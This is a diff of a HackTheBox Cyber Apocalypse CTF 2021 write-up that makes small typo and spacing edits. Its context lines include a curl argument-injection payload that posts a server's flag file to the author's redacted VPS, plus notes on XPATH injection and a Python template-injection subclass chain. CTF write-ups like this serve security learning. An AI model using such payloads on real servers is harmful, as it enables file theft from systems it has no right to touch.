@@ -7,7 +7,7 @@ thumbnail: /img/htb-cyberapocalypsectf2021.png
 tags: HTB,CyberApocalypseCTF21,web,forensics,misc
 ---
 
-We participated in the 5 days long Cyber Apocalypse CTF 21 hosted by HackTheBox and secured 94th place against 4740 teams comprised of 9900 players! I had final exams during this event but it's the first public CTF of HackTheBox! how could I resist? 
+We participated in the 5 days long Cyber Apocalypse CTF 21 hosted by HackTheBox and secured 94th place against 4740 teams comprised of 9900 players! I had final exams during this event but it's the first public CTF of HackTheBox! How could I resist? 
 
 ![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424083614.png)
 
@@ -339,7 +339,7 @@ Upgrade-Insecure-Requests: 1
 CHTB{b4d_4li3n_pr0gr4m1ng}
 ```
 
-
+&nbsp;
 ## # Caas
 
 This was also one of the easiest web challenges. We were given application source code. There was an argument injection vulnerability on "curl" command which can be seen on "challenge/models/CommandModel.php":
@@ -368,6 +368,7 @@ ip=-F password=@/flag http://[REDACTED-MY-VPS-IP]:8000/
 CHTB{f1le_r3trieval_4s_a_s3rv1ce}
 ```
 
+&nbsp;
 ## # E.Tree
 
 This challenge contained an XPATH injection vulnerability. We were given an XML file that contained hint to where the flag is:
@@ -474,6 +475,7 @@ As we've seen from the XML file, the flag was split into two record sections thu
 CHTB{Th3_3xTr4_l3v3l_4Cc3s$_c0nTr0l}
 ```
 
+&nbsp;
 ## # The Galactic Times
 
 This was a great challenge with hilarious homepage content. We were given source code of the application. We get a feedback form on the "/feedback" endpoint:
@@ -742,7 +744,7 @@ We can reach the subclasses:
 
 ![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424075420.png)
 
-The "os.popen" method or "catch\_warnings" classe is not available in this list, there's "os.\_wrap_close" present on "132" index.
+The "os.popen" method or "catch\_warnings" class is not available in this list, there's "os.\_wrap_close" present on "132" index.
 
 ![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424075604.png)
 
